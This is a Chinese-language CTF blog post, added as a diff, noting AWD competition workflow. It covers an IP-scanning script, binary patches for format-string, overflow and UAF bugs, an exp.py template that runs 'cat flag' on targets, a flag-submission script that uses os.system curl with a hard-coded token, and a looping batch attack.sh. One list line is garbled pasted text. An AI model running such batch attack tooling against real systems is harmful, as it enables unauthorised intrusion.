@@ -1,0 +1,458 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>AWD学习 | Zechariahの博客</title><meta name="author" content="Zechariah"><meta name="copyright" content="Zechariah"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="AWD流程 改init_hosts.py中的ip格式和port 改submit_flag.py中的提交方式和token 改round_wait_time xxxxxxxxxx6 1size_t fread(void ptr, size_t size, size_t nmemb, FILE stream)2​3ptr – 这是指向带有最小尺寸 size*nmemb 字节的内存块的指针4size –">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AWD学习">
+<meta property="og:url" content="https://zechariah-0703.github.io/2025/02/16/AWD%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Zechariahの博客">
+<meta property="og:description" content="AWD流程 改init_hosts.py中的ip格式和port 改submit_flag.py中的提交方式和token 改round_wait_time xxxxxxxxxx6 1size_t fread(void ptr, size_t size, size_t nmemb, FILE stream)2​3ptr – 这是指向带有最小尺寸 size*nmemb 字节的内存块的指针4size –">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zechariah-0703.github.io/img/fengmian.png">
+<meta property="article:published_time" content="2025-02-16T12:15:12.000Z">
+<meta property="article:modified_time" content="2025-03-25T17:17:52.193Z">
+<meta property="article:author" content="Zechariah">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zechariah-0703.github.io/img/fengmian.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://zechariah-0703.github.io/2025/02/16/AWD%E5%AD%A6%E4%B9%A0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'AWD学习',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-03-26 01:17:52'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><script src="/live2d-widget/autoload.js"></script><meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/loading.gif" data-original="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/fengmian.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Zechariahの博客"><span class="site-name">Zechariahの博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">AWD学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-02-16T12:15:12.000Z" title="发表于 2025-02-16 20:15:12">2025-02-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-25T17:17:52.193Z" title="更新于 2025-03-26 01:17:52">2025-03-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="AWD学习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ul>
+<li>改<code>init_hosts.py</code>中的<code>ip</code>格式和<code>port</code></li>
+<li>改<code>submit_flag.py</code>中的提交方式和<code>token</code></li>
+<li>改<code>round_wait_time</code></li>
+<li>xxxxxxxxxx6 1size_t fread(void <em>ptr, size_t size, size_t nmemb, FILE </em>stream)2​3ptr – 这是指向带有最小尺寸 size*nmemb 字节的内存块的指针4size – 这是要读取的每个元素的大小，以字节为单位5nmemb – 这是元素的个数，每个元素的大小为 size 字节6stream – 这是指向 FILE 对象的指针，该 FILE 对象指定了一个输入流C</li>
+<li>写<code>exp</code></li>
+<li>批量攻击</li>
+</ul>
+<h2 id="扫描IP"><a href="#扫描IP" class="headerlink" title="扫描IP"></a>扫描IP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">import requests
+import threading
+ 
+li &#x3D; lambda x : print(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)
+ll &#x3D; lambda x : print(&#39;\x1b[01;38;5;1m&#39; + x + &#39;\x1b[0m&#39;)
+ 
+def check_ip(i):
+    try:
+        url &#x3D; f&#39;http:&#x2F;&#x2F;192-168-1-&#123;i&#125;.awd.bugku.cn&#x2F;&#39; #*
+        response &#x3D; requests.get(url, timeout&#x3D;0.5)
+        if response.status_code &#x3D;&#x3D; 200:
+            li(&#39;[+] &#39; + url)
+            with open(&#39;hosts&#39;, &#39;a+&#39;) as f:
+                f.write(f&#39;192-168-1-&#123;i&#125;.awd.bugku.cn:9999\n&#39;) #*
+        else:
+            raise Exception(&quot;Not 200 OK&quot;)
+    except Exception as e:
+        ll(&#39;[-] &#39; + url)
+        with open(&#39;h&#39;, &#39;a+&#39;) as f:
+            f.write(f&#39;192-168-1-&#123;i&#125;.awd.bugku.cn:9999\n&#39;) #*
+ 
+NUM_THREADS &#x3D; 256
+ 
+threads &#x3D; []
+for i in range(1, 256):
+    thread &#x3D; threading.Thread(target&#x3D;check_ip, args&#x3D;(i,))
+    threads.append(thread)
+    thread.start()
+ 
+    if len(threads) &gt;&#x3D; NUM_THREADS:
+        for t in threads:
+            t.join()
+        threads &#x3D; []
+ 
+for t in threads:
+    t.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul>
+<li>IDA</li>
+<li>加沙箱：<a target="_blank" rel="noopener" href="https://github.com/TTY-flag/evilPatcher#/">https://github.com/TTY-flag/evilPatcher#/</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/aftern00n/AwdPwnPatcher#/">https://github.com/aftern00n/AwdPwnPatcher#/</a></li>
+</ul>
+<h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><ul>
+<li><p>加沙箱通防</p>
+<ul>
+<li>sandboxs里改禁用规则<ul>
+<li>python3 evil_patcher.py file_name sandboxfile</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>IDA的patch步骤：<code>Edit</code> -&gt;<code>Patch program</code> -&gt; <code>Apply patches to input file</code></p>
+</li>
+<li><p>AWDPwnPatcher使用</p>
+</li>
+<li><code>from AwdPwnPatcher import *binary = &quot;filename&quot;awd_pwn_patcher = AwdPwnPatcher(binary)</code></li>
+<li><code>add_patch_in_ehframe(assembly=&quot;&quot;, machine_code=[])</code></li>
+<li><code>patch_origin(start, end=0, assembly=&quot;&quot;, machine_code=[], string=&quot;&quot;)</code></li>
+<li><code>patch_by_jmp(self, jmp_from, jmp_to=0, assembly=&quot;&quot;, machine_code=[])</code></li>
+<li><code>patch_by_call(self, call_from, assembly=&quot;&quot;, machine_code=[])</code></li>
+<li><code>add_constant_in_ehframe(self, string)</code></li>
+<li><code>save(self, save_path=&quot;&quot;)</code></li>
+</ul>
+<h3 id="具体漏洞修复"><a href="#具体漏洞修复" class="headerlink" title="具体漏洞修复"></a>具体漏洞修复</h3><h4 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h4><h5 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">from AwdPwnPatcher import *
+binary &#x3D; &quot;filename&quot;
+awd_pwn_patcher &#x3D; AwdPwnPatcher(binary)
+
+awd_pwn_patcher.patch_fmt_by_call(address)  #call printf地址
+awd_pwn_patcher.save()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h5 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">from AwdPwnPatcher import *
+binary &#x3D; &quot;filename&quot;
+awd_pwn_patcher &#x3D; AwdPwnPatcher(binary)
+ 
+fmt_offset &#x3D; awd_pwn_patcher.add_constant_in_ehframe(&quot;%s\\x00\\x00&quot;)  #添加%s
+ 
+assembly &#x3D; &quot;&quot;&quot;
+mov rsi, qword ptr [rbp-0x8]
+lea rdi, qword ptr [&#123;&#125;]
+&quot;&quot;&quot;.format(hex(fmt_offset))
+ 
+awd_pwn_patcher.patch_by_jmp(0x706, jmp_to&#x3D;0x712, assembly&#x3D;assembly)    #改printf，mov rax地址和call printf地址
+awd_pwn_patcher.save()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">from AwdPwnPatcher import *
+binary &#x3D; &quot;filename&quot;
+awd_pwn_patcher &#x3D; AwdPwnPatcher(binary)
+ 
+assembly &#x3D; &#39;&#39;&#39;
+push 0x20   #缩小输入范围，控制寄存器push进去的值
+&#39;&#39;&#39;
+ 
+awd_pwn_patcher.patch_origin(0x8048476, end&#x3D;0x804847b, assembly&#x3D;assembly)   #原push地址和push的下一条地址
+awd_pwn_patcher.save()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><h5 id="32位-1"><a href="#32位-1" class="headerlink" title="32位"></a>32位</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">from AwdPwnPatcher import *
+binary &#x3D; &quot;.&#x2F;filename&quot;
+awd_pwn_patcher &#x3D; AwdPwnPatcher(binary)
+ 
+assembly &#x3D; &quot;&quot;&quot;
+add esp, 0x10
+mov eax, 0
+mov edx, dword ptr [ebp - 0x20]
+mov eax, 0x804a060  #被释放的地址
+lea eax, dword ptr [eax + edx*4]
+mov dword ptr [eax], 0
+&quot;&quot;&quot;
+ 
+awd_pwn_patcher.patch_by_jmp(0x80485bf, jmp_to&#x3D;0x80485c7, assembly&#x3D;assembly)    #call free地址和下一条地址
+awd_pwn_patcher.save()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h5 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">from AwdPwnPatcher import *
+binary &#x3D; &quot;.&#x2F;filename&quot;
+awd_pwn_patcher &#x3D; AwdPwnPatcher(binary)
+ 
+assembly &#x3D; &quot;&quot;&quot;
+mov eax, 0
+mov eax, dword ptr [rbp - 0x1c]
+cdqe
+lea rdx, qword ptr [0x201040]
+lea rax, qword ptr [rdx + rax*8]
+mov qword ptr [rax], 0
+&quot;&quot;&quot;
+ 
+awd_pwn_patcher.patch_by_jmp(0x838, jmp_to&#x3D;0x83d, assembly&#x3D;assembly)
+awd_pwn_patcher.save()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="gets-栈溢出"><a href="#gets-栈溢出" class="headerlink" title="gets 栈溢出"></a>gets 栈溢出</h4><p>只有gets函数能够接受用户输入时，将流程劫持到.eh_frame段，利用syscall构造read函数，就能控制输入数据的长度。<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">.eh_frame:0000000000400F7D mov     rax, 0          ;#define __NR_read 0
+.eh_frame:0000000000400F84 mov     rdi, 0          ; fd
+.eh_frame:0000000000400F8B lea     rsi, [rbp+buf]  ; buf
+.eh_frame:0000000000400F8E mov     rdx, 90h        ; count
+.eh_frame:0000000000400F95 syscall
+.eh_frame:0000000000400F97 jmp     loc_400AB4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<h4 id="负数绕过"><a href="#负数绕过" class="headerlink" title="负数绕过"></a>负数绕过</h4><p>输入负数-1也满足jle，修复方法：将JLE改为JBE<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">cmp     eax, 20h
+jle     short loc_8048777<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env python3
+# A script for awd exp
+ 
+import os
+import sys
+from time import sleep
+from pwn import *
+ 
+context(arch&#x3D;&#39;amd64&#39;, os&#x3D;&#39;linux&#39;, log_level&#x3D;&#39;debug&#39;)
+ 
+file_name &#x3D; &#39;.&#x2F;pwn&#39;
+ 
+li &#x3D; lambda x : print(&#39;\x1b[01;38;5;214m&#39; + str(x) + &#39;\x1b[0m&#39;)
+ll &#x3D; lambda x : print(&#39;\x1b[01;38;5;1m&#39; + str(x) + &#39;\x1b[0m&#39;)
+ 
+ 
+def write_to_flags(d):
+    fd &#x3D; open(&#39;.&#x2F;flags&#39;, &#39;ab&#39;)
+    fd.write(d + b&#39;\n&#39;)
+    fd.close()
+ 
+ip &#x3D; server_ip &#x3D; sys.argv[1].split(&#39;:&#39;)[0]
+port &#x3D; int(sys.argv[1].split(&#39;:&#39;)[1])
+r &#x3D; remote(ip, port)
+ 
+......	#exp
+ 
+r.sendline(b&#39;cat flag&#39;)
+r.recvuntil(b&#39;&#123;&#39;)
+flag &#x3D; b&#39;viol1t&#123;&#39; + r.recvuntil(b&#39;&#125;&#39;)
+write_to_flags(flag)
+ 
+r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="submit-flag-py"><a href="#submit-flag-py" class="headerlink" title="submit_flag.py"></a>submit_flag.py</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env python3
+# A script for awd loop submit flag
+import threading
+from time import sleep
+import os
+import json
+import requests
+ 
+flag_file &#x3D; &#39;.&#x2F;flags&#39;
+threads &#x3D; []
+ 
+def submit(flag):
+    try:
+        # url &#x3D; &#39;https:&#x2F;&#x2F;ctf.bugku.com&#x2F;awd&#x2F;submit.html?token&#x3D;88b02ce3b420ec1f4b4a2e02dd6fe305&amp;flag&#x3D;&#39; + flag[:-1]
+        url &#x3D; f&quot;curl -X POST http:&#x2F;&#x2F;27.25.152.77:19999&#x2F;api&#x2F;flag -H &#39;Authorization: 7f120ca9b0e3024d06734a04a986cc55&#39; -d &#39;&#123;&#123; \&quot;flag\&quot;: \&quot;&#123;flag[:-1]&#125;\&quot;&#125;&#125;&#39;&quot;
+        print(url)
+        # r &#x3D; requests.get(url)
+        os.system(url)
+        print(&#39;\x1b[01;38;5;214m[+] pwned!\x1b[0m&#39;)
+    except Exception as e:
+        print(&#39;\x1b[01;38;5;214m[-] connect fail: &#123;&#125;\x1b[0m&#39;.format(str(e)))
+def main():
+    with open(flag_file) as flag_txt:
+        flags &#x3D; flag_txt.readlines()
+        for flag in flags:
+            thread &#x3D; threading.Thread(target&#x3D;submit, args&#x3D;(flag,))
+            threads.append(thread)
+            thread.start()
+        for thread in threads:
+            thread.join()
+if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
+    main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="attack-sh"><a href="#attack-sh" class="headerlink" title="attack.sh"></a>attack.sh</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">#! &#x2F;bin&#x2F;bash
+ 
+attack_times&#x3D;10000
+round_wait_time&#x3D;30 #half time
+wait_submit_time&#x3D;5
+log_file&#x3D;&quot;logs&quot;
+run_time&#x3D;120 #timeout
+next_attack_time&#x3D;2.5 
+max_concurrent_attacks&#x3D;10 # Max number of concurrent attacks
+ 
+log()&#123;
+    t&#x3D;$(date &quot;+%H:%M:%S&quot;)
+    m&#x3D;&quot;[$t]$1&quot; # Fixed missing parameter usage
+    info&#x3D;&quot;\033[43;37m $m \033[0m&quot;
+    echo -e &quot;$info&quot;
+    echo -e &quot;$m&quot; &gt;&gt; $log_file
+&#125;
+ 
+attack() &#123;
+    echo &quot;-- round $1 -- &quot; &gt;&gt; all_flags
+    cat flags &gt;&gt; all_flags
+    rm flags
+    local jobs&#x3D;0
+    for line in $(cat hosts); do
+        timeout --foreground $run_time python3 .&#x2F;exp.py &quot;$line&quot; &amp;
+        sleep $next_attack_time
+        ((jobs++))
+        if [ &quot;$jobs&quot; -ge &quot;$max_concurrent_attacks&quot; ]; then
+            wait # Wait for all background jobs to finish
+            jobs&#x3D;0
+        fi
+    done
+    wait # Ensure all attacks are complete before moving on
+    echo -e &quot;\x1b[47;30m Waiting $wait_submit_time s to submit flag\x1b[0m&quot;
+    sleep $wait_submit_time
+    echo -e &quot;\x1b[47;30m Submitting flag\x1b[0m&quot;
+    python3 .&#x2F;submit_flag.py
+&#125;
+ 
+for ((i&#x3D;1; i &lt;&#x3D; attack_times; i++)); do
+    m&#x3D;&quot;-------- round $i --------&quot;
+    log &quot;$m&quot;
+    attack $i
+    echo -e &quot;\x1b[47;30m Waiting next round\x1b[0m&quot;
+    sleep $round_wait_time
+done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="流量监控"><a href="#流量监控" class="headerlink" title="流量监控"></a>流量监控</h2><h3 id="pwn-waf"><a href="#pwn-waf" class="headerlink" title="pwn_waf"></a>pwn_waf</h3><p><a target="_blank" rel="noopener" href="https://github.com/i0gan/pwn_waf/tree/main">https://github.com/i0gan/pwn_waf/tree/main</a></p>
+<p>创建一个文件夹并赋一定权限，改makefile中的log path为该文件夹地址，make后将pwn和catch放到创建的文件夹中，再用catch替换pwn文件，此时exp打用catch替换的pwn文件即可在创建的文件夹中接收到流量</p>
+<h3 id><a href="#" class="headerlink" title=" "></a> </h3></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://zechariah-0703.github.io">Zechariah</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://zechariah-0703.github.io/2025/02/16/AWD%E5%AD%A6%E4%B9%A0/">https://zechariah-0703.github.io/2025/02/16/AWD学习/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zechariah-0703.github.io" target="_blank">Zechariahの博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a></div><div class="post_share"><div class="social-share" data-image="/img/fengmian.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/loading.gif" data-original="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/loading.gif" data-original="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/02/16/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E5%AF%B9%E9%BD%90/" title="PWN技巧-栈对齐"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PWN技巧-栈对齐</div></div></a></div><div class="next-post pull-right"><a href="/2025/02/14/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B%E6%95%B4%E7%90%86/" title="C语言函数原型整理"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">C语言函数原型整理</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2025/02/14/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B%E6%95%B4%E7%90%86/" title="C语言函数原型整理"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-14</div><div class="title">C语言函数原型整理</div></div></a></div><div><a href="/2025/02/22/Art-of-shellcode/" title="Art_of_shellcode"><img class="cover" src="/img/loading.gif" data-original="/img/fengmian.png" alt="cover"><div 